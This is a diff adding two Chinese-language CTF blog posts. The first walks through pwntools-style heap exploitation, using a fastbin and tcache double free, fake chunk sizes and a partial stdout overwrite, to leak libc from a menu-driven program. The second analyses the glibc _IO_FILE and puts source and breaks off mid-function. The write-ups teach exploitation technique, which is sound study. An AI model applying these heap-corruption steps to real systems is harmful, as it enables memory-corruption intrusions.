@@ -261,6 +261,535 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/photo/hello.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/09/以fastbin为基础的leak/" itemprop="url">以fastbin为基础的leak</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-09T07:55:17+08:00">
+                2019-08-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  809
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  3
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>fastbin作为单链表的存在，无法直接泄露libc地址，但是我们也是有方法进行伪造、转换，进行libc地址的泄露的。</p>
+<p>以下情况方法的讨论的前提时可以进行uaf利用</p>
+<h4 id="无tcache保护"><a href="#无tcache保护" class="headerlink" title="无tcache保护"></a>无tcache保护</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x60</span>, <span class="number">0</span>, <span class="string">'a'</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">1</span>, <span class="string">'b'</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">2</span>, <span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">3</span>, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/09/以fastbin为基础的leak/1.PNG" alt="1"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/2.PNG" alt="2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(0x60, 4, &apos;\x60&apos;)#更改链表，指向我们伪造的地址</span><br><span class="line">create(0x60, 5, &apos;\n&apos;)</span><br><span class="line">create(0x60, 6, &apos;\n&apos;)</span><br><span class="line">create(0x60, 7, p64(0) + p64(0xe1))</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因为我们伪造的数据0x71，所以这里我们可以绕过这个malloc的检查</p>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/3.PNG" alt="3"></p>
+<p>成功申请伪造的chunk地址，并且更改了0x005…080的数据，成功的伪造了第二个chunk即大小0xe1,不再进入fastbin链中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/4.PNG" alt="4"></p>
+<p>可以看到unsortbin链中已经有了chunk块</p>
+<p>此时堆中即有了libc地址，或使用程序提供的show函数，或者爆破改写libc地址使之控制stdout或stderr，即可进行libc泄露</p>
+<h5 id="无tcache下的任意地址写"><a href="#无tcache下的任意地址写" class="headerlink" title="无tcache下的任意地址写"></a>无tcache下的任意地址写</h5><p>还是上面那个程序，继续进行利用，使用改写stdout的方式进行libc泄露用以展示任意地址写</p>
+<p>这时候我们已经得到了一个unsortbin块，一方面，再次构造一个unsortbin可以吗？不太好弄，因为这个伪造的chunk块其实也是爆破了2字节出来的，只不过我这里虚拟机的pie关了，所以没有爆破</p>
+<p>直接释放，然后改写地址，再次申请呢？也不行，因为只申请0x60大小的chunk块，只能分割这个unsortbin，没办法申请到任意地址</p>
+<p>还得是伪造chunk块，先分割</p>
+<p>先看一下直接分割伪造的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">create(0x28, 8, &apos;\n&apos;)</span><br><span class="line">create(0x38, 8, &apos;\n&apos;)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/7.PNG" alt="7"></p>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/8.PNG" alt="8"></p>
+<p>这时候就可以进行改写libc地址为stdout或stderr</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">2</span>,p16(<span class="number">0x25dd</span>))<span class="comment">#stderr</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">6</span>, p16(<span class="number">0x25dd</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">8</span>, <span class="string">'\0'</span> * <span class="number">0x33</span> + p64(<span class="number">0x00000000fbad2887</span> + <span class="number">0x1000</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">'\x88'</span>)</span><br></pre></td></tr></table></figure>
+<p>剩下的步骤就是改写利用free_hook或者malloc_hook了，不再提及</p>
+<h4 id="有tcache保护"><a href="#有tcache保护" class="headerlink" title="有tcache保护"></a>有tcache保护</h4><p>看一下tcache_get的源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并没有fastbin那么复杂，甚至没有size检查，so，伪造起来很容易</p>
+<p>初期的时候差不多，但是更简单</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x40</span>,<span class="number">0</span>,p64(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,p64(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">2</span>,p64(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/21.PNG" alt="21"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">0</span>,<span class="string">"\x50"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,<span class="string">"\n"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/22.PNG" alt="22"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x555555757250:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x555555757260:	0x000055555575720a	0x0000000000000021</span><br></pre></td></tr></table></figure>
+<p>满tcache</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for x in range(7):</span><br><span class="line">	free(0)</span><br></pre></td></tr></table></figure>
+<p>最关键的一步，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rename(2,p64(0)+p64(0x51))</span><br><span class="line">free(0)</span><br><span class="line">rename(2,p64(0)+p64(0x91))</span><br><span class="line">free(0)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/23.PNG" alt="23"></p>
+<p>关键的原因在于，通过这一步，不仅得到了unsortbin(如果仅仅为了得到unsortbin，可以更简单，先改，然后free八次就够了)</p>
+<p>但是这里多free了一次，因为还要用tcache进行fd的修改</p>
+<h5 id="有tchche的情况下的任意地址写"><a href="#有tchche的情况下的任意地址写" class="headerlink" title="有tchche的情况下的任意地址写"></a>有tchche的情况下的任意地址写</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+<span class="string">"\x60\x07\xdd"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">0</span>,<span class="string">"\n"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/24.PNG" alt="24"></p>
+<p>至此，完成初步利用</p>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/25.PNG" alt="25"></p>
+<p>成功泄露出libc的地址</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/05/从stdout入手解决leak泄露/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/photo/hello.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/05/从stdout入手解决leak泄露/" itemprop="url">从stdout入手解决leak泄露</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-05T15:18:32+08:00">
+                2019-08-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  7
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>leak地址的泄露是大部分pwn程序进行权限获取的一个必经的步骤。</p>
+<p>我准备记录一波利用stdout进行leak的操作</p>
+<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>file结构体的结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">_IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>分析一波puts函数的调用过程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  <span class="keyword">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>
+<p>其是由<code>_IO_puts</code>函数实现，其内部调用<code>_IO_sputn</code>,实际上和输出直接相关的只有这个函数，<a href="https://baijiahao.baidu.com/s?id=1606846314561521273&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">而<code>_IO_sputn</code>会被化简为虚函数表里的__xsputn指针</a></p>
+<p><img src="/2019/08/05/从stdout入手解决leak泄露/u=4050324728,2035627572&amp;fm=173&amp;app=25&amp;f=JPEG.jpg" alt="u=4050324728,2035627572&amp;fm=173&amp;app=25&amp;f=JPEG"></p>
+<p>也就是接着执行<code>_IO_new_file_xsputn</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  <span class="keyword">size_t</span> to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;<span class="comment">//初始缓冲区空间</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">char</span> *p;</span><br><span class="line">          <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> (*--p == <span class="string">'\n'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  count = p - s + <span class="number">1</span>;<span class="comment">//看情况缩小</span></span><br><span class="line">                  must_flush = <span class="number">1</span>;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">        count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">        <span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">           caller that everything has been written.  */</span></span><br><span class="line">        <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">        &#123;</span><br><span class="line">          count = new_do_write (f, s, do_write);</span><br><span class="line">          to_do -= count;</span><br><span class="line">          <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">            <span class="keyword">return</span> n - to_do;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">         buffer, but it's somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">         so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">        to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure>
+<p>主要的作用就是判断了缓冲区还够不够用，然后进行文件指针的写入操作，还有输出操作，但是很可惜并没有我们可以随意控制的地址的输出。但是在输出操作之前，正常情况下会进行一个判断 <code>if (_IO_OVERFLOW (f, EOF) == EOF)</code></p>
+<p>也就是调用了_IO_OVERFLOW 函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= 